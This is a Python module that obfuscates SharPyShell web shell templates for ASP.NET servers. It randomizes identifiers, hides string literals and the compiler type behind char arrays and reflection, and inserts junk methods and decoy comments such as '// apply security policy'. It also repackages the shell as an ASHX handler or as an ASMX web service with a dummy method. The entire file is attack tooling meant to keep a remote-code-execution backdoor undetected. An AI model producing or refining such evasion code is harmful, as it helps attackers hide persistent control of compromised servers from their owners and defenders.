import random
import string
import re


CSHARP_KEYWORDS = {
    'abstract', 'as', 'base', 'bool', 'break', 'byte', 'case', 'catch',
    'char', 'checked', 'class', 'const', 'continue', 'decimal', 'default',
    'delegate', 'do', 'double', 'else', 'enum', 'event', 'explicit',
    'extern', 'false', 'finally', 'fixed', 'float', 'for', 'foreach',
    'goto', 'if', 'implicit', 'in', 'int', 'interface', 'internal',
    'is', 'lock', 'long', 'namespace', 'new', 'null', 'object',
    'operator', 'out', 'override', 'params', 'private', 'protected',
    'public', 'readonly', 'ref', 'return', 'sbyte', 'sealed', 'short',
    'sizeof', 'stackalloc', 'static', 'string', 'struct', 'switch',
    'this', 'throw', 'true', 'try', 'typeof', 'uint', 'ulong',
    'unchecked', 'unsafe', 'ushort', 'using', 'virtual', 'void',
    'volatile', 'while', 'var', 'get', 'set', 'value', 'where',
}

TEMPLATE_IDENTIFIERS = {
    'raw_aes': [
        'ConvertHexStringToByteArray', 'AESEnc', 'AESDec',
        'hexString', 'byteValue', 'data', 'index',
        'encrypted', 'encryptor', 'msEncrypt', 'csEncrypt',
        'decryptor', 'msDecrypt', 'csDecrypt', 'srDecrypt', 'sf',
        'plain', 'rijAlg', 'Key', 'IV',
        'password', 'decoded_request_byte', 'runtime_code_byte',
        'runtime_code', 'runtime_exec_output', 'results', 'provider',
        'compilerParams', 'output_runtime_code_enc', 'output_runtime_code_enc_b64',
        'exc_out_str', 'exc', 'o', 'mi',
    ],
    'raw_xor': [
        'Xor_Enc_Dec',
        'input', 'password', 'key', 'output',
        'decoded_request_byte', 'runtime_code_byte', 'runtime_code',
        'runtime_exec_output', 'compilerParams', 'provider', 'results',
        'output_runtime_code_enc', 'output_runtime_code_enc_b64',
        'exc_out_str', 'exc', 'o', 'mi',
    ],
    'encrypted_dll': [
        'aS', 'mi', 'iN', 'oU',
        'p', 'r', 'a', 'o', 'i',
    ],
    'encrypted_dll_ulong_compression': [
        'int_arr_r', 'int_arr',
        'aS', 'mi', 'iN', 'oU',
        'p', 'r', 'a', 'o', 'i',
    ],
}

STRINGS_TO_ENCODE = {
    'raw_aes': ['SharPyShell', 'ExecRuntime'],
    'raw_xor': ['SharPyShell', 'ExecRuntime'],
    'encrypted_dll': ['SharPy', 'Run'],
    'encrypted_dll_ulong_compression': ['SharPy', 'Run'],
}

_CLASS_PREFIXES = [
    'Data', 'Content', 'Resource', 'Service', 'Config', 'Cache', 'Session',
    'Auth', 'Page', 'Log', 'Event', 'Task', 'File', 'Batch', 'App',
    'Web', 'Api', 'Core', 'Net', 'Sys', 'Base', 'View', 'Form',
]

_CLASS_SUFFIXES = [
    'Handler', 'Manager', 'Provider', 'Helper', 'Service', 'Processor',
    'Controller', 'Factory', 'Module', 'Worker', 'Bridge', 'Adapter',
    'Wrapper', 'Loader', 'Builder', 'Router', 'Resolver', 'Validator',
]

_DUMMY_METHOD_PREFIXES = ['Get', 'Check', 'Verify', 'Load', 'Init', 'Fetch', 'Query']
_DUMMY_METHOD_SUFFIXES = ['Status', 'Version', 'Config', 'Health', 'Info', 'State', 'Data']

_DECOY_COMMENTS = [
    '// validate input parameters',
    '// check session state',
    '// apply security policy',
    '// initialize cache layer',
    '// serialize output buffer',
    '// parse configuration entry',
    '// handle retry logic',
    '// compute verification hash',
    '// update audit log',
    '// normalize encoding format',
    '// load module settings',
    '// refresh token state',
    '// apply output filter',
    '// verify request origin',
]


def random_class_name():
    prefix = random.choice(_CLASS_PREFIXES)
    suffix = random.choice(_CLASS_SUFFIXES)
    num = str(random.randint(1, 99)) if random.random() > 0.5 else ''
    return prefix + suffix + num


def random_method_name():
    prefix = random.choice(_DUMMY_METHOD_PREFIXES)
    suffix = random.choice(_DUMMY_METHOD_SUFFIXES)
    return prefix + suffix


class CSharpObfuscator:

    def __init__(self):
        self._used_names = set()

    def _random_name(self, min_len=6, max_len=14):
        while True:
            first = random.choice(string.ascii_letters + '_')
            rest_len = random.randint(min_len - 1, max_len - 1)
            rest = ''.join(random.choices(
                string.ascii_letters + string.digits + '_', k=rest_len
            ))
            name = first + rest
            if name not in self._used_names and name.lower() not in CSHARP_KEYWORDS:
                self._used_names.add(name)
                return name

    def _preserve_strings(self, code):
        strings = {}
        counter = [0]
        def _repl(m):
            token = '\x00STR' + str(counter[0]) + '\x00'
            strings[token] = m.group(0)
            counter[0] += 1
            return token
        code = re.sub(r'@"(?:[^"]|"")*"|"(?:[^"\\]|\\.)*"', _repl, code)
        return code, strings

    def _restore_strings(self, code, strings):
        for token, original in strings.items():
            code = code.replace(token, original)
        return code

    @staticmethod
    def _encode_as_char_array(s):
        chars = ','.join('(char)' + str(ord(c)) for c in s)
        return 'new string(new char[]{' + chars + '})'

    def randomize_identifiers(self, code, identifiers):
        code, strings = self._preserve_strings(code)
        mapping = {}
        for ident in sorted(identifiers, key=len, reverse=True):
            new_name = self._random_name()
            mapping[ident] = new_name
            code = re.sub(r'(?<!\.)\b' + re.escape(ident) + r'\b', new_name, code)
        code = self._restore_strings(code, strings)
        return code, mapping

    def encode_string_literals(self, code, literals):
        for s in sorted(literals, key=len, reverse=True):
            encoded = self._encode_as_char_array(s)
            code = code.replace('"' + s + '"', encoded)
        return code

    def use_reflection_for_compiler(self, code):
        if 'CSharpCodeProvider' not in code:
            return code
        type_name = (
            'Microsoft.CSharp.CSharpCodeProvider, System, '
            'Version=4.0.0.0, Culture=neutral, '
            'PublicKeyToken=b77a5c561934e089'
        )
        encoded_type = self._encode_as_char_array(type_name)
        refl_expr = (
            '(CodeDomProvider)Activator.CreateInstance('
            'Type.GetType(' + encoded_type + '))'
        )
        code = code.replace(
            'CSharpCodeProvider provider = new CSharpCodeProvider()',
            'CodeDomProvider provider = ' + refl_expr
        )
        code = code.replace('<%@ Import Namespace="Microsoft.CSharp" %>\n', '')
        code = code.replace('using Microsoft.CSharp;\n', '')
        return code

    def add_junk_code(self, code, num_methods=3):
        junk_methods = []
        for _ in range(num_methods):
            junk_methods.append(self._generate_junk_method())
        junk_block = '\n\n'.join(junk_methods)
        if '</script>' in code:
            code = code.replace('</script>', '\n' + junk_block + '\n\n</script>')
        else:
            last_brace = code.rfind('}')
            if last_brace > 0:
                code = code[:last_brace] + '\n' + junk_block + '\n\n' + code[last_brace:]
        return code

    def _generate_junk_method(self):
        method_name = self._random_name(8, 16)
        ret_type = random.choice(['void', 'int', 'string', 'bool', 'byte[]'])
        params = self._gen_junk_params()
        body_lines = []
        for _ in range(random.randint(2, 5)):
            body_lines.append('    ' + self._gen_junk_var_decl())
        if ret_type == 'int':
            body_lines.append('    return ' + str(random.randint(0, 255)) + ';')
        elif ret_type == 'string':
            body_lines.append('    return "";')
        elif ret_type == 'bool':
            body_lines.append('    return ' + random.choice(['true', 'false']) + ';')
        elif ret_type == 'byte[]':
            body_lines.append('    return new byte[' + str(random.randint(0, 4)) + '];')
        body = '\n'.join(body_lines)
        return ret_type + ' ' + method_name + '(' + params + ') {\n' + body + '\n}'

    def _gen_junk_params(self):
        n = random.randint(0, 2)
        types = ['int', 'string', 'byte[]', 'bool', 'object']
        parts = []
        for _ in range(n):
            parts.append(random.choice(types) + ' ' + self._random_name(3, 6))
        return ', '.join(parts)

    def _gen_junk_var_decl(self):
        var_name = self._random_name(4, 8)
        choice = random.randint(0, 4)
        if choice == 0:
            return 'int ' + var_name + ' = ' + str(random.randint(1, 9999)) + ' ^ ' + str(random.randint(1, 9999)) + ';'
        elif choice == 1:
            return 'string ' + var_name + ' = "".PadLeft(' + str(random.randint(0, 8)) + ');'
        elif choice == 2:
            return 'byte[] ' + var_name + ' = new byte[' + str(random.randint(0, 8)) + '];'
        elif choice == 3:
            return 'bool ' + var_name + ' = ' + str(random.randint(0, 999)) + ' > ' + str(random.randint(0, 999)) + ';'
        else:
            return 'double ' + var_name + ' = ' + '{:.4f}'.format(random.uniform(0, 100)) + ';'

    def add_decoy_comments(self, code):
        lines = code.split('\n')
        result = []
        for line in lines:
            result.append(line)
            stripped = line.strip()
            if (random.random() < 0.06
                    and stripped
                    and not stripped.startswith('//')
                    and not stripped.startswith('<%')
                    and not stripped.startswith('using ')
                    and '{' not in line and '}' not in line):
                indent = len(line) - len(line.lstrip())
                result.append(' ' * indent + random.choice(_DECOY_COMMENTS))
        return '\n'.join(result)

    def obfuscate(self, code, template_type, password_hash, file_format='aspx'):
        identifiers = list(TEMPLATE_IDENTIFIERS.get(template_type, []))

        if file_format == 'ashx':
            identifiers.append('context')
        elif file_format == 'asmx':
            identifiers.append('ctx')

        code = self.use_reflection_for_compiler(code)

        if identifiers:
            code, _ = self.randomize_identifiers(code, identifiers)

        strings_to_enc = list(STRINGS_TO_ENCODE.get(template_type, []))
        strings_to_enc.append(password_hash)
        code = self.encode_string_literals(code, strings_to_enc)

        code = self.add_junk_code(code)
        code = self.add_decoy_comments(code)

        return code


def _extract_script_body(aspx_code):
    imports = re.findall(r'<%@\s*Import\s+Namespace="([^"]+)"\s*%>', aspx_code)
    script_match = re.search(
        r'<script[^>]*>\s*(.*?)\s*</script>', aspx_code, re.DOTALL
    )
    if script_match:
        csharp_code = script_match.group(1)
    else:
        csharp_code = aspx_code
    return imports, csharp_code


def _extract_method_body(code, method_re):
    match = re.search(method_re, code)
    if not match:
        return code, '', ''
    before = code[:match.start()]
    brace_pos = code.index('{', match.end())
    depth = 1
    pos = brace_pos + 1
    while pos < len(code) and depth > 0:
        if code[pos] == '{':
            depth += 1
        elif code[pos] == '}':
            depth -= 1
        pos += 1
    body = code[brace_pos + 1:pos - 1]
    after = code[pos:]
    return before, body, after


def _insert_response_completion(body, ctx_var):
    lines = body.split('\n')
    last_write_idx = -1
    for i, line in enumerate(lines):
        if ctx_var + '.Response.Write(' in line:
            last_write_idx = i
    if last_write_idx >= 0:
        indent = '\t\t'
        completion = [
            indent + ctx_var + '.Response.Flush();',
            indent + ctx_var + '.Response.SuppressContent = true;',
            indent + ctx_var + '.ApplicationInstance.CompleteRequest();',
        ]
        lines = lines[:last_write_idx + 1] + completion + lines[last_write_idx + 1:]
    return '\n'.join(lines)


def convert_aspx_to_ashx(aspx_code, class_name):
    imports, csharp_code = _extract_script_body(aspx_code)

    csharp_code = re.sub(
        r'void\s+Page_Load\s*\(\s*object\s+\w+\s*,\s*EventArgs\s+\w+\s*\)',
        'public void ProcessRequest(HttpContext context)',
        csharp_code
    )
    csharp_code = re.sub(r'(?<!\w)(?<!\.)Request\.', 'context.Request.', csharp_code)
    csharp_code = re.sub(r'(?<!\w)(?<!\.)Response\.', 'context.Response.', csharp_code)

    all_imports = set(imports)
    all_imports.add('System.Web')
    using_block = '\n'.join('using ' + ns + ';' for ns in sorted(all_imports))

    result = '<%@ WebHandler Language="C#" Class="' + class_name + '" %>\n\n'
    result += using_block + '\n\n'
    result += 'public class ' + class_name + ' : IHttpHandler {\n\n'
    result += csharp_code + '\n\n'
    result += 'public bool IsReusable { get { return false; } }\n\n'
    result += '}\n'
    return result


def convert_aspx_to_asmx(aspx_code, class_name, dummy_method):
    imports, csharp_code = _extract_script_body(aspx_code)

    page_load_re = r'void\s+Page_Load\s*\(\s*object\s+\w+\s*,\s*EventArgs\s+\w+\s*\)'
    helper_code, page_load_body, trailing = _extract_method_body(csharp_code, page_load_re)

    page_load_body = re.sub(
        r'(?<!\w)(?<!\.)Request\.', 'ctx.Request.', page_load_body
    )
    page_load_body = re.sub(
        r'(?<!\w)(?<!\.)Response\.', 'ctx.Response.', page_load_body
    )

    page_load_body = _insert_response_completion(page_load_body, 'ctx')

    all_imports = set(imports)
    all_imports.add('System.Web')
    all_imports.add('System.Web.Services')
    using_block = '\n'.join('using ' + ns + ';' for ns in sorted(all_imports))

    constructor = (
        'public ' + class_name + '() {\n'
        '\tHttpContext ctx = HttpContext.Current;\n'
        '\tif (ctx != null && ctx.Request != null '
        '&& ctx.Request.HttpMethod == "POST") {\n'
        + page_load_body + '\n'
        '\t}\n'
        '}\n'
    )

    result = '<%@ WebService Language="C#" Class="' + class_name + '" %>\n\n'
    result += using_block + '\n\n'
    result += '[WebService(Namespace = "http://tempuri.org/")]\n'
    result += 'public class ' + class_name + ' : System.Web.Services.WebService {\n\n'
    result += helper_code.strip() + '\n\n'
    result += constructor + '\n'
    result += '[WebMethod]\n'
    result += 'public string ' + dummy_method + '() { return ""; }\n\n'
    result += '}\n'
    return result
